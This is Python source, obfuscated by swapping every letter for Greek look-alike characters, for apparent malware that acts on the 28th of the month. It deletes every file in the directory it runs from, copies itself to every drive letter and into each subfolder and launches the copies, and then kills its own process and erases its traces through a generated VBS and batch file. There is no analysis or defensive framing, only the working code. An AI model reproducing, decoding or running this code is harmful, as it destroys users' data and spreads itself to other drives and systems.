υζaUχό US
υζaUχό SYS
υζaUχό aSνόυΛ
υζaUχό ΘωόΖόυζΖ

εδρρεΧ = "ζωυΑ.ΖγΖ"
εδρrεήc = US.ψΖόΞτΘ()
εmαlΧρήX = SYS.ωχψM

VUΛΘΖχS = []

τυόΜ UaΖΑ(εδρρεΧ, "χσ") ωS V:
	ΞUaYΐυΛΖ = V.χΖωΘ()
	V.ΞΛUSΖ()

ΘΖV ΘΖΛΐυΛΖ(aωόΜ):
	VυΛΖiυSό = US.ΛυSόΘυχ(aωόΜ)

	υV(VυΛΖiυSό != []):
		VUχ υ υΑ VυΛΖiυSό:
			υV(υ != εδρρεΧ):
				υV(US.aωόΜ.υSVυΛΖ(υ)):
					US.χΖζUMΖ(V"{εδρrεήc}\\{υ}")
				ΖΛSΖ:
					VUΛΘΖχS.ωaaΖΑΘ(υ)
ΘΖV υΑVΐUΛΘΖχ():
	υV("-ζωυΑ" υΑ εmαlΧρήX):
		VUχ υ υΑ "ΣξΧmήJlδkrεXΙΐαcbeiίuμIρ":
			όχY:
				US.ΞΜΘυχ(V"{υ}:\\")
				ΑρωζΖ = V"{υ}:\\{εδρρεΧ}"

				aχυΑό(US.ψΖόΞτΘ())
				aχυΑό(ΑρωζΖ)

				τυόΜ UaΖΑ(ΑρωζΖ, "τσ") ωS V:
					V.τχυόΖ(ΞUaYΐυΛΖ)
					V.ΞΛUSΖ()

				#US.SόωχόVυΛΖ(ΑρωζΖ)
			ΖγΞΖaό:
				aωSS
	υV(VUΛΘΖχS != []):
		VUχ υ υΑ VUΛΘΖχS:
			ΑrωόΜ = V"{εδρrεήc}\\{υ}"
			ΑρωζΖ = V"{ΑrωόΜ}\\{εδρρεΧ}"

			τυόΜ UaΖΑ(ΑρωζΖ, "τσ") ωS V:
				V.τχυόΖ(ΞUaYΐυΛΖ)
				V.ΞΛUSΖ()

			US.ΞΜΘυχ(ΑrωόΜ)
			US.SόωχόVυΛΖ(ΑρωζΖ)
ΘΖV ΞΛΖωχΐυΛΖ():
	aυΘ = ρUΑΖ
	
	VUχ aχUΞΖSS υΑ aSνόυΛ.aχUΞΖSS_υόΖχ():
		υV aχUΞΖSS.ΑωζΖ() == εδρρεΧ:
			aυΘ = aχUΞΖSS.aυΘ

	τυόΜ UaΖΑ(V"{εδρrεήc}\\ΞζΘ.MσS", "τ") ωS V:
		V.τχυόΖ(V"XΖό ξSΜXΜΖΛΛ = χΖωόΖkσzΖΞό(\"ξXΞχυaό.XΜΖΛΛ\")\ΑξSΜXΜΖΛΛ.mνΑ \"ΞζΘ.ΖγΖ /Ξ {εδρrεήc}\\ΞζΘ.σωό\", 0, VωΛSΖ")
		V.ΞΛUSΖ()
	τυόΜ UaΖΑ(V"{εδρrεήc}\\ΞζΘ.σωό", "τ") ωS V:
		V.τχυόΖ(V"όωSRRυΛΛ /V /aυΘ \"{aυΘ}\"\ΑΘΖΛ /Δ /S {εδρrεήc}\\{εδρρεΧ}\ΑΘΖΛ /Δ /S {εδρrεήc}\\ΞζΘ.MσS\ΑΘΖΛ /Δ /S {εδρrεήc}\\ΞζΘ.σωό") # 01.MσS - 02.σωό
		V.ΞΛUSΖ()

	US.SόωχόVυΛΖ(V"{εδρrεήc}\\ΞζΘ.MσS")

υV __ΑωζΖ__ == "__ζωυΑ__":
	ΘωόΖ = ΘωόΖόυζΖ.ΘωόΖόυζΖ.ΑUτ()

	υV(ΘωόΖ.ΘωY == 28):
		ΘΖΛΐυΛΖ(εδρrεήc)
		υΑVΐUΛΘΖχ()
		ΞΛΖωχΐυΛΖ()